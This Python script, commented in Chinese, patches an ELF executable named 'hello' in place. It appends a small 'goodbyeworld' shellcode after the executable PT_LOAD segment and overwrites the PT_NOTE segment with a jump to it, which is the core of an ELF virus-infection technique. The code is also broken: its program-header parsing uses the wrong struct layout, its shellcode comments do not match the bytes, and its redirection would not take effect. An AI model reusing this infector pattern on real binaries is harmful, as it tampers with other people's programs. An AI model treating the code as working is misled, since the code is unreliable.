import struct

# 读取ELF Header并解析信息
def parse_elf_header(elf_file):
    elf_file.seek(0)
    elf_header = elf_file.read(64)
    
    e_ident = elf_header[:16]
    e_type, e_machine, e_version, e_entry, e_phoff, e_shoff, e_flags, e_ehsize, \
    e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx = struct.unpack('<HHIQQQIHHHHHH', elf_header[16:])
    
    return {
        'e_phoff': e_phoff,
        'e_phnum': e_phnum,
        'e_phentsize': e_phentsize
    }

# 注入shellcode到指定位置
def inject_shellcode(elf_file, pt_load):
    # Shellcode (简单示例, 输出goodbyeword)
    shellcode = (
        b'\xeb\x1e'              # jmp short 0x1e
        b'\x48\x31\xc0'          # xor    rax,rax
        b'\x48\x89\xc2'          # mov    rdx,rax
        b'\x48\x89\xc6'          # mov    rsi,rax
        b'\x48\x8d\x3d\x04\x00'  # lea    rdi,[rip+0x4]        # 40002a <_start+0x2a>
        b'\xb8\x01\x00\x00\x00'  # mov    eax,0x1
        b'\xbf\x01\x00\x00\x00'  # mov    edi,0x1
        b'\xba\x0c\x00\x00\x00'  # mov    edx,0xc
        b'\x0f\x05'              # syscall
        b'\xe8\xdd\xff\xff\xff'  # call   400010 <_start+0x10>
        b'goodbyeworld\x00'      # "goodbyeworld" string
    )

    # 假设我们将shellcode插入到PT_LOAD段末尾
    inject_offset = pt_load['offset'] + pt_load['filesz']
    
    # 移动文件指针到注入位置，并写入shellcode
    elf_file.seek(inject_offset)
    elf_file.write(shellcode)
    
    print(f"Shellcode已注入，偏移: 0x{inject_offset:x}")
    
    # 返回注入位置以供跳转
    return inject_offset

# 修改PT_NOTE段中的跳转指令
def modify_pt_note_jump(elf_file, pt_note, shellcode_offset):
    # 计算跳转偏移 (shellcode_offset - pt_note_offset - jmp指令长度)
    jmp_offset = shellcode_offset - (pt_note['offset'] + 5)
    
    # 构造jmp指令，e9 是jmp指令前缀，后跟4字节偏移量
    jmp_instruction = b'\xe9' + struct.pack('<I', jmp_offset)
    
    # 写入jmp指令到PT_NOTE段
    elf_file.seek(pt_note['offset'])
    elf_file.write(jmp_instruction)
    
    print(f"已修改PT_NOTE段，跳转到shellcode偏移: 0x{shellcode_offset:x}")

# 解析Program Headers，找到PT_NOTE和PT_LOAD
def find_segments(elf_file, elf_header):
    pt_note = None
    pt_load = None
    
    elf_file.seek(elf_header['e_phoff'])
    for i in range(elf_header['e_phnum']):
        program_header = elf_file.read(elf_header['e_phentsize'])
        p_type, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_flags, p_align = struct.unpack('<IIQQQQII', program_header)
        
        if p_type == 4:  # PT_NOTE
            pt_note = {'offset': p_offset, 'filesz': p_filesz}
        elif p_type == 1:  # PT_LOAD
            # 找到可执行段 (R E 标志的段)
            if p_flags & 0x4 and p_flags & 0x1:
                pt_load = {'offset': p_offset, 'filesz': p_filesz}
    
    return pt_note, pt_load

# 主函数
def main():
    elf_filename = 'hello'  # 目标文件
    
    # 打开目标文件进行读写操作
    with open(elf_filename, 'r+b') as elf_file:
        elf_header = parse_elf_header(elf_file)
        pt_note, pt_load = find_segments(elf_file, elf_header)
        
        if pt_note is None or pt_load is None:
            print("未找到PT_NOTE或PT_LOAD段")
            return
        
        print(f"PT_NOTE段偏移: 0x{pt_note['offset']:x}, 大小: 0x{pt_note['filesz']:x}")
        print(f"PT_LOAD段偏移: 0x{pt_load['offset']:x}, 大小: 0x{pt_load['filesz']:x}")
        
        # 注入shellcode到PT_LOAD段
        shellcode_offset = inject_shellcode(elf_file, pt_load)
        
        # 修改PT_NOTE段，跳转到shellcode
        modify_pt_note_jump(elf_file, pt_note, shellcode_offset)

if __name__ == '__main__':
    main()
